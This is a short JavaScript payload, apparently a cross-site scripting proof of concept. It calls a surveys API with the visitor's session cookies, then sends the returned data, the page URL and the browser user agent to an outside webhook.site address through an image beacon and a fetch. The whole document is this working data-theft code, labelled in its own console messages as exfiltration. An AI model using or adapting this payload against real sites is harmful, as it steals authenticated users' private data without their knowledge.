fetch("/api/surveys/installations/697e3220babd563bdc5cb817/surveys/active", {
  method: "GET",
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  console.log("[+] API data received:", data);

  const payload = {
    data,
    url: location.href,
    ua: navigator.userAgent
  };

  const exfilUrl = "https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?data=" + encodeURIComponent(JSON.stringify(payload));

  console.log("[+] Exfiltrating to:", exfilUrl);

  // Use both image and fetch
  const img = new Image();
  img.src = exfilUrl;

  fetch(exfilUrl, { mode: "no-cors" });
})
.catch(err => {
  const errorUrl = "https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?error=" + encodeURIComponent(err.message);
  new Image().src = errorUrl;
});
